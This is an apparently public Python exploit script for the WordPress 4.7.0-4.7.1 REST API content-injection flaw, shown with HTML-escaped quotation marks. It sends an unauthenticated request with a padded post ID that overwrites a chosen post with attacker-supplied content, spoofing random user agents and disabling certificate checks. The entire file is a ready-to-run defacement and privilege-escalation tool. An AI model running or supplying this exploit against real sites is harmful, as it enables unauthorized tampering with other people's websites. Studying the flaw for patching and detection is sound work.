&#039;&#039;&#039;
    WordPress 4.7.0-4.7.1 REST API Post privilege escalation / defacement exploit

    @dustyfresh
    Date: 02-01-2017

    Original vuln disclosed by Sucuri&#039;s research team

    Reference:
        https://wpvulndb.com/vulnerabilities/8734
&#039;&#039;&#039;
import requests
from fake_useragent import UserAgent
import argparse
import urllib.parse
import random
import string

def attack(target, postID, payload):
    ua = { &#039;user-agent&#039;: UserAgent().random }
    uwotm8 = &#039;&#039;.join([random.choice(string.ascii_letters) for n in range(8)])
    sploit_api = &#039;http://{}/index.php?rest_route=/wp/v2/posts/{}&id={}{}&content={}&#039;.format(target, postID, postID, uwotm8, payload)
    attack = requests.post(sploit_api, data = {}, headers=ua, verify=False)
    if attack.status_code == 200:
        print(&#039;Payload sent to {} with 200 status&#039;.format(target))
    else:
        print(&#039;Payload sent to {}, but we are not sure if the attack was successful as {} was the response&#039;.format(target, attack.status_code))


if __name__ == &#039;__main__&#039;:
    parser = argparse.ArgumentParser(description=&#039;WordPress 4.7.0-4.7.1 REST API Post privilege escalation / defacement exploit&#039;)
    parser.add_argument(&#039;--target&#039;, &#039;-t&#039;, type=str, required=True, help=&#039;Post ID in which the payload will be applied&#039;)
    parser.add_argument(&#039;--postID&#039;, &#039;-pid&#039;, type=str, required=True, help=&#039;Post ID in which the payload will be applied&#039;)
    parser.add_argument(&#039;--payload&#039;, &#039;-p&#039;, type=str, required=True, help=&#039;What you would like to replace the post with&#039;)

    args = parser.parse_args()
    target = args.target
    postID = args.postID
    payload = urllib.parse.quote_plus(args.payload)
    attack(target, postID, payload)

